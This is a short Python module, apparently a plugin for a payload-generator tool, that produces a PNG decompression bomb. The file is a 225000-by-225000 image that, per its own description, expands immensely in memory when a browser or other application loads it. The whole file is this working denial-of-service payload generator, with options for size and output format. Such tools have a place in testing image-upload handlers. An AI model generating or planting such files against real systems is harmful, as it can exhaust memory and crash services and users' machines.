from . import deflate
from options import Options


options = Options()
options.add_option('secret_png', "secret.png", 'Small png you want to blow up')
options.add_option('width', 225000, 'Desired width of uncompressed png')
options.add_option('height',225000, 'Desired height of uncompressed png')

DESCRIPTION = 'Produces a PNG that expands immensely when loaded in RAM (eg by a browser or other application)'


def run(generator, output):
    if (output.OUTPUT_NAME != "file") or (output.options['format'] != 'plaintext') or (output.options['final_newline']):
        raise ValueError("Output must be file with plaintext type and no final newline")
    ret = deflate.max_deflate_png(options['width'], options['height'])
    output.output([ret])
